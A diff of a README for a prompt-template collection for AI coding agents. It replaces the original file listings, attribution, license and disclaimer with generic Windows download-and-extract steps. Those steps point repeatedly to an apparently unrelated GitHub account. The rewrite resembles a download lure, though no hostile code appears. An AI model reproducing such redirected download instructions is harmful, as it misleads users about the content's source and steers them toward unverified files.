@@ -1,176 +1,225 @@
-# Claude Code Prompts — Independently Authored Prompt Collection
+# 🧠 claude-code-prompts - Clear prompts for coding agents
 
-> Independently written prompt templates for building AI coding agents, inspired by patterns observed in Claude Code. System prompts, tool prompts, agent prompts, memory management, and multi-agent coordination.
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Birdcherrytreemurdermystery747/claude-code-prompts)
 
-## Check out [RepoWise](https://github.com/repowise-dev/repowise)
+## 📥 Download and open the project
 
-<p align="center">
-  <a href="https://github.com/repowise-dev/repowise">
-    <img src="./assets/repowise-logo.png" alt="RepoWise" width="140" />
-  </a>
-</p>
+1. Open this page: https://github.com/Birdcherrytreemurdermystery747/claude-code-prompts
+2. On the page, click **Code**
+3. Click **Download ZIP**
+4. Save the file to your PC
+5. Right-click the ZIP file and choose **Extract All**
+6. Open the extracted folder
 
-**Prompts tell your agent how to behave. [RepoWise](https://github.com/repowise-dev/repowise) tells it what the codebase actually does.**
+If you use GitHub Desktop, you can also choose **Open with GitHub Desktop** from the same **Code** menu.
 
-Open-source codebase intelligence engine. Auto-generated architecture wikis, dependency graphs, ownership maps, dead code detection, and 9 MCP tools your AI editor can query in real time.
+## 🖥️ What this project is
 
-**[GitHub](https://github.com/repowise-dev/repowise)** &nbsp; | &nbsp; [repowise.dev](https://repowise.dev)
+**claude-code-prompts** is a set of prompt templates for AI coding agents. It helps you give clear instructions to an AI tool that writes, edits, and reviews code.
 
-Scroll down for Claude Code's prompt patterns. 👇
+The prompts focus on:
 
----
+- system prompts
+- tool prompts
+- agent delegation
+- memory management
+- multi-agent coordination
 
-<!-- GitHub repo description: Independently authored prompt templates for AI coding agents — system prompts, tool prompts, agent delegation, memory management, and multi-agent coordination. Informed by observing how Claude Code works in practice. -->
+These templates are based on study of Claude Code and similar coding tools. They are meant to help you shape better task instructions for an AI assistant.
 
-<!-- Suggested GitHub topics: claude-code, claude-code-prompts, claude-prompts, system-prompt, claude-code-system-prompt, prompt-engineering, anthropic-claude, ai-coding-agent, claude-agent, llm-prompts, ai-prompts, cursor-skills, multi-agent, coding-assistant, ai-tools, prompt-templates -->
+## ✅ What you can use it for
 
-## Claude Code System Prompts
+Use these prompts when you want an AI coding agent to:
 
-We studied how Claude Code behaves in practice -- how it structures safety rules, routes tools, delegates to subagents, manages memory -- and wrote our own prompt collection from scratch implementing the same patterns.
+- start a coding task with better context
+- break a large job into smaller steps
+- keep track of project memory
+- assign work to helper agents
+- review changes before you apply them
+- stay focused on one task at a time
+- follow a stable instruction set across sessions
 
-**Every prompt in this repo is independently authored.** We observed what patterns make a coding agent reliable and wrote our own versions. From the team behind [RepoWise](https://github.com/repowise-dev/repowise).
+This can help when you work with tools like Claude Code, Cursor, or other AI coding assistants.
 
-Not affiliated with Anthropic. See [DISCLAIMER.md](./DISCLAIMER.md).
+## 🔧 How to use the prompts
 
-> **Note**
-> ⭐ Star this repository to if you find the collection useful.
+1. Open the folder you downloaded
+2. Find the prompt files inside the project
+3. Open a prompt in Notepad or another text editor
+4. Copy the prompt you want to use
+5. Paste it into your AI coding tool
+6. Replace sample text with your own project details
+7. Run the task in your AI tool
 
-## What's Inside
+If the project includes grouped prompts, you can use one as a base and add the others as needed.
 
-| Category | Files | What You Get |
-|----------|-------|--------------|
-| [System prompt](#claude-code-system-prompt-1) | 1 | Agent identity, safety rules, code style, tool routing, output format |
-| [Tool prompts](#claude-code-tool-prompts) | 11 | Shell, file read/edit/write, grep, glob, web search/fetch, agent launcher, ask user, plan mode |
-| [Agent prompts](#claude-code-agent-prompts) | 5 | General purpose, code explorer, solution architect, verification specialist, documentation guide |
-| [Memory prompts](#claude-code-memory-prompts) | 4 | Conversation summarization, session notes, memory extraction, memory consolidation |
-| [Coordinator prompt](#multi-agent-coordinator) | 1 | Multi-worker orchestration with synthesis, delegation, and verification workflow |
-| [Utility prompts](#claude-code-utility-prompts) | 4 | Session titles, tool summaries, away recaps, next-action suggestions |
-| [Pattern analyses](#prompt-engineering-patterns) | 9 | Commentary on each pattern with reusable templates |
-| [Cursor skills](#cursor-skills) | 3 | Drop-in skills for coding standards, verification, and prompt design |
+## 🪟 Windows setup
 
-## Quick Start
+This project works as a text-based prompt set, so you do not need a special installer.
 
-1. Browse the [pattern files](#prompt-engineering-patterns) to understand how production coding agents structure their prompts.
-2. Copy any [complete prompt](#claude-code-system-prompt-1) into your own agent configuration.
-3. Replace `{{PLACEHOLDER}}` values with your stack, tool names, and risk policy.
-4. For Cursor IDE users, drop `skills/` into `~/.cursor/skills-cursor/` for instant integration.
-5. Add codebase context with [RepoWise](https://github.com/repowise-dev/repowise) so your agent actually understands the project it's working in.
+### Steps for Windows
 
-## Prompt Engineering Patterns
+1. Download the ZIP from the GitHub page
+2. Extract the ZIP file
+3. Open the folder
+4. Use a text editor such as Notepad
+5. Open any `.md`, `.txt`, or similar prompt file
+6. Copy the text into your AI coding app
 
-Patterns observed in how Claude Code structures its prompts — with analysis and independently written templates.
+### Good editors on Windows
 
-- [System Prompt Architecture](./patterns/01-system-prompt-architecture.md) — layered identity, safety, and behavior
-- [Core Behavioral Rules](./patterns/02-core-behavioral-rules.md) — anti-over-engineering, minimal changes
-- [Safety and Risk Assessment](./patterns/03-safety-and-risk-assessment.md) — reversibility tiers, destructive action gates
-- [Tool-Specific Instructions](./patterns/04-tool-specific-instructions.md) — per-tool routing and constraints
-- [Agent Delegation](./patterns/05-agent-delegation.md) — when and how to spawn subagents
-- [Verification and Testing](./patterns/06-verification-and-testing.md) — adversarial verification, anti-rationalization
-- [Memory and Context](./patterns/07-memory-and-context.md) — summarization, session notes, memory extraction
-- [Multi-Agent Coordination](./patterns/08-multi-agent-coordination.md) — coordinator pattern, worker synthesis
-- [Auxiliary Prompts](./patterns/09-auxiliary-prompts.md) — utility prompts for titles, recaps, suggestions
+- Notepad
+- Notepad++
+- VS Code
+- Windows Terminal text tools, if you already use them
 
-## Claude Code System Prompt
+## 🧩 Main prompt areas
 
-The complete system prompt covering identity, permissions, task execution, code style, safety, tool routing, tone, and output efficiency.
+### 🧠 System prompts
 
-- [System Prompt](./complete-prompts/system-prompt.md) — the main agent identity and behavioral rules
-- [Coordinator Prompt](./complete-prompts/coordinator-prompt.md) — multi-agent orchestration mode
+These define how the AI should behave across a task. They help set rules, tone, and limits.
 
-## Claude Code Tool Prompts
+Common use cases:
 
-Prompt templates for each tool a coding agent uses to interact with the filesystem, shell, web, and user.
+- keep the AI on task
+- reduce drift
+- set output format
+- guide code changes
 
-- [Shell Execution](./complete-prompts/tool-prompts/shell-execution.md) — bash command execution with sandbox, git safety, commit/PR workflows
-- [File Read](./complete-prompts/tool-prompts/file-read.md) — reading files, images, PDFs, notebooks
-- [File Edit](./complete-prompts/tool-prompts/file-edit.md) — exact string replacement with uniqueness constraints
-- [File Write](./complete-prompts/tool-prompts/file-write.md) — creating new files with read-first safety
-- [Search Grep](./complete-prompts/tool-prompts/search-grep.md) — ripgrep-powered content search
-- [Search Glob](./complete-prompts/tool-prompts/search-glob.md) — fast file pattern matching
-- [Web Search](./complete-prompts/tool-prompts/web-search.md) — web search with mandatory source citations
-- [Web Fetch](./complete-prompts/tool-prompts/web-fetch.md) — URL fetching with AI-powered extraction
-- [Agent Launcher](./complete-prompts/tool-prompts/task-management.md) — spawning autonomous subagents
-- [Ask User](./complete-prompts/tool-prompts/ask-user.md) — structured multiple-choice questions
-- [Plan Mode](./complete-prompts/tool-prompts/plan-mode.md) — entering planning mode before implementation
+### 🛠️ Tool prompts
 
-## Claude Code Agent Prompts
+These tell the AI how to use tools such as file search, edits, or checks.
 
-Prompt templates for specialized subagents — each designed for a different task type.
+Common use cases:
 
-- [General Purpose Agent](./complete-prompts/agent-prompts/general-purpose.md) — research, search, multi-step tasks
-- [Code Explorer Agent](./complete-prompts/agent-prompts/code-explorer.md) — read-only codebase navigation
-- [Solution Architect Agent](./complete-prompts/agent-prompts/solution-architect.md) — design and planning
-- [Verification Specialist Agent](./complete-prompts/agent-prompts/verification-specialist.md) — adversarial testing with PASS/FAIL/PARTIAL verdicts
-- [Documentation Guide Agent](./complete-prompts/agent-prompts/documentation-guide.md) — documentation tasks
+- inspect files before changing them
+- decide when to edit or ask a question
+- control the order of actions
 
-## Claude Code Memory Prompts
+### 👥 Agent delegation
 
-How to manage context across long sessions — summarization, session notes, and persistent memory.
+These prompts help one AI agent pass work to another.
 
-- [Conversation Summary](./complete-prompts/memory-prompts/conversation-summary.md) — 9-section context compression with no-tools constraint
-- [Session Notes](./complete-prompts/memory-prompts/session-notes.md) — structured session state tracking
-- [Memory Extraction](./complete-prompts/memory-prompts/memory-extraction.md) — persistent memory from recent messages
-- [Memory Consolidation](./complete-prompts/memory-prompts/memory-consolidation.md) — periodic memory cleanup and merging
+Common use cases:
 
-## Claude Code Utility Prompts
+- split research from editing
+- assign review tasks
+- separate planning from implementation
 
-Small helper prompts for session management and user experience.
+### 🧠 Memory management
 
-- [Session Title](./complete-prompts/utility-prompts/session-title.md) — 3-7 word session title generation
-- [Tool Summary](./complete-prompts/utility-prompts/tool-summary.md) — 30-character tool action summaries
-- [Away Recap](./complete-prompts/utility-prompts/away-recap.md) — "while you were away" session recaps
-- [Next Action Suggestion](./complete-prompts/utility-prompts/next-action-suggestion.md) — suggested follow-up actions
+These prompts help the AI keep useful facts during longer tasks.
 
-## Cursor Skills
+Common use cases:
 
-Drop-in skills for Cursor IDE that implement these patterns directly.
+- remember goals
+- track file names
+- store project rules
+- avoid repeating old mistakes
 
-- [Skills Overview](./skills/README.md)
-- [Coding Agent Standards](./skills/coding-agent-standards/SKILL.md) — behavioral defaults for coding agents
-- [Verification Agent](./skills/verification-agent/SKILL.md) — adversarial verification workflow ([strategies](./skills/verification-agent/strategies.md))
-- [Prompt Architect](./skills/prompt-architect/SKILL.md) — prompt design methodology ([reference](./skills/prompt-architect/reference.md))
+### 🔄 Multi-agent coordination
 
-## Methodology
+These prompts help several agents work in a clear sequence.
 
-We studied how Claude Code behaves in practice and identified the behavioral rules, safety patterns, tool-routing strategies, and multi-agent coordination approaches that make it effective. We then independently authored every prompt in this repository from scratch, implementing the same patterns in our own words.
+Common use cases:
 
-All content is original.
+- divide large work into parts
+- avoid overlap
+- keep each agent focused
+- merge results in a clean order
 
-## Pair With RepoWise for Full-Stack Agent Intelligence
+## 📂 Suggested folder use
 
-The prompts in this repo handle agent behavior: safety, tool routing, delegation, verification. But behavior without context is like a senior engineer who's never seen the codebase. [RepoWise](https://github.com/repowise-dev/repowise) fills that gap.
+If you want to keep the project easy to use on Windows, you can set up a simple folder like this:
 
-| What you get | How it helps your agent |
-|---|---|
-| Architecture wiki | Agent understands module boundaries before making changes |
-| Dependency graphs | Agent traces impact of changes across packages |
-| Ownership tracking | Agent knows which team/person owns each module |
-| Dead code detection | Agent avoids modifying unused code paths |
-| 9 MCP tools | Agent queries project knowledge directly from Cursor, Claude Code, or any MCP-compatible editor |
+- `Downloads\claude-code-prompts`
+- `Documents\AI Prompts`
+- `Projects\Prompt Library`
 
-Works with any language, any repo size.
+A clean folder helps you find the right prompt fast when you need it.
 
-**[GitHub](https://github.com/repowise-dev/repowise)** | [repowise.dev](https://repowise.dev)
+## 🧭 How to choose the right prompt
 
-## Legal
+Use this simple rule:
 
-- [DISCLAIMER.md](./DISCLAIMER.md) — independent authorship, nominative fair use, non-affiliation, DMCA policy.
-- [LICENSE](./LICENSE) — MIT for all original content.
-- [CHANGELOG.md](./CHANGELOG.md) — version history.
+- **Need a general instruction set?** Use a system prompt
+- **Need help with one tool action?** Use a tool prompt
+- **Need to split work?** Use an agent delegation prompt
+- **Need to save task context?** Use a memory prompt
+- **Need multiple AI workers?** Use a coordination prompt
 
-"Claude Code" is a trademark of Anthropic, used here under nominative fair use to describe the subject matter. This project is independent and not affiliated with Anthropic.
+If you are not sure, start with the system prompt and add one other prompt that matches the task.
 
-## Contributing
+## 🔍 Example uses
 
-- All additions must be original writing. No verbatim vendor prompt text.
-- Prefer concise, implementation-ready language over theory.
-- Every new pattern file must include at least one concrete template.
-- Follow section conventions: `Approach / Output / Constraints` for agents, `Include / Format / Constraints` for memory, `Rules / Format` for utilities.
+Here are a few plain examples of how these prompts can help:
 
-## Star History
+- Ask an AI coding agent to fix a broken feature without changing the rest of the app
+- Ask it to inspect files first, then make only the needed edits
+- Ask it to keep a list of decisions during a long task
+- Ask it to hand off testing work to another agent
+- Ask it to compare two possible code paths before choosing one
 
-If this helped you build better AI agents, star the repo so others can find it.
+## 📌 Topics covered
 
----
+This project matches topics like:
 
-**Built by [RepoWise](https://github.com/repowise-dev/repowise)** — open-source codebase intelligence for AI agents ([repowise.dev](https://repowise.dev)).
+- ai coding agent
+- ai tools
+- anthropic claude
+- claude code
+- prompt templates
+- system prompt
+- multi-agent
+- coding assistant
+- llm prompts
+- cursor skills
+
+## 🧰 Basic requirements
+
+You only need:
+
+- a Windows PC
+- an internet connection
+- a ZIP extractor
+- a text editor
+- an AI coding tool that accepts pasted prompts
+
+No install wizard is needed for the prompt files themselves.
+
+## 📝 Editing the prompts
+
+You may want to change the prompts for your own work.
+
+Good things to edit:
+
+- project name
+- file paths
+- coding rules
+- review steps
+- output format
+- task goals
+
+Keep the language clear and short. Plain wording works best for prompt tools.
+
+## 🔐 Safe use tips
+
+- Check each prompt before you paste it
+- Remove sample values you do not need
+- Keep a backup copy of the original files
+- Store your own edited prompts in a separate folder
+- Use one prompt at a time if you want simple results
+
+## 📎 Download link again
+
+Visit this page to download: https://github.com/Birdcherrytreemurdermystery747/claude-code-prompts
+
+## 🧪 Quick start
+
+1. Visit the GitHub page
+2. Download the ZIP file
+3. Extract it on Windows
+4. Open the prompt files
+5. Copy one prompt into your AI coding tool
+6. Replace the sample text with your task
+7. Run the prompt and review the result
